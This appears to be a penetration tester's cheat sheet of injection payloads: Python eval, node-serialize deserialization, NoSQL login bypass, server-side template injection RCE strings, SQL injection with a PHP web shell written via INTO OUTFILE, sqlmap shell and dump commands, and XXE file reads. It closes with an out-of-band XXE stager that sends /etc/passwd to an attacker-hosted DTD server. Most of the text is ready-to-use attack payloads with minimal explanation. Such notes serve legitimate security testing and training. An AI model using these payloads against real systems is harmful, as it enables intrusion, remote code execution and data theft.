# Types

- Code Injection
- Deserialization Injection
- NoSQL Injection
- Server-Side Template Injection
- SQL Injection
- XML External Entity

# Code Injection

## Python

Eval Command Execution
`eval("__import__('os').system('id')")`

# Deserialization Injection

## JavaScript

Payload Generator
```
var y = {
	rce : function(){
		require('child_process').exec('ping -c 1 ipaddress /', function(error, stdout,	stderr) { console.log(stdout) });
	},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

# NoSQL Injection

Test Payload 1
`admin' || '' === '`

Test Payload 2
```
Content-Type: application/x-www-form-urlencoded
user=admin&password[$ne]=admin
```

Test Payload 3
```
Content-Type: application/json
{
	"user":"admin",
```

Test Payload 4
```
Content-Type: application/json
{
	"user":"admin",
	"password":{
		"$ne":"admin"
	}
}
```

# Server-Side Template Injection

## Nunjucks (NodeJS)

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('payload')")()}}
```

## Java

RCE Payload 1
```
*
{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('payload')
.getInputStream())}
```

## Python

Test Payload 1
`{{1+1}}` (Should eval to 2)

RCE Payload 1
`{{config.__class__.__init__.__globals__['os'].popen('payload').read()}}`

RCE Payload 2
```
{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen("payload").read()}}
```

# SQL Injection

## Manual

### Enumeration

Basic Error Test
`value'`

Confirm SQL Injection Possible (if error goes away)
Note: The last dash protects the trailing space, which can get removed otherwise
`value' -- -`

Circumvent Query Condition
`' or 1=1;-- -`

Determine Number of Columns in Select (add/remove numbers until no error)
`value' union select 1,2,3-- -`

Get DB version (assuming injection returns field 2)
`value' union select 1,@@version,3-- -`

### Exploitation

Into Outfile Web Shell
`value' union select "<?php echo system($_REQUEST['c']); ?>" into outfile '/var/www/html/shell.php'-- -`

## sqlmap

### Request

Save Request
`In burp, intercept the request, and right click > Save Item. (E.g.: request.req)`

Initial Tests (--batch accepts all defaults to prompts)
```
sqlmap -r request.req --batch

Can set risk and levels as needed. E.g., 
sqlmap -r request.req --batch --risk=3 --level=3

This switch was used on HTB, but not documented in man page:
--force-ssl
```

Attempt Getting Shell via RCE
`sqlmap -r request.req --os-shell`

Check User Privs (E.g., FILE)
`sqlmap -r request.req --batch --privileges`

Enumerate databases
`sqlmap -r request.req --batch --dbs`

Get table names from dbname database
`sqlmap -r request.req --batch -D dbname --tables`

Dump the tblname table
`sqlmap -r request.req -D dbname -T tblname --dump`

### CLI Spec

Login, Username Param
`sqlmap -u http://url/endpoint?action=login --data="username=abc&password=abc" -p username [--level 5 --risk 3 to find more options] --batch`

JSON API
`sqlmap -u "protocol:address:port" --data '{"param_name": "*"}' --dbs [--threads 10 for speed] [--level 5 --risk 3 to find more options] --batch`

# XML External Entity

For best results, don't modify any formatting found used by the client/server.

## LFI Method 1

```
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<exampletag>&file;</exampletag>
```

Note: If the system has PHP and you want to base64 encode a file (binary, PDF, etc.) for easy transfer, use the following:
`<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/path/to/file">`
## LFI Method 2

Create Payload
```
evil.dtd accessible via attacker web server:

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://attacker/?p=%file;'>" >
```

Start web server

Inject Stager
```
<?xml version="1.0" ?>
<!DOCTYPE ANY [
<!ENTITY % remote SYSTEM 'http://attacker/evil.dtd'>%remote;%init;%trick;
]>
```
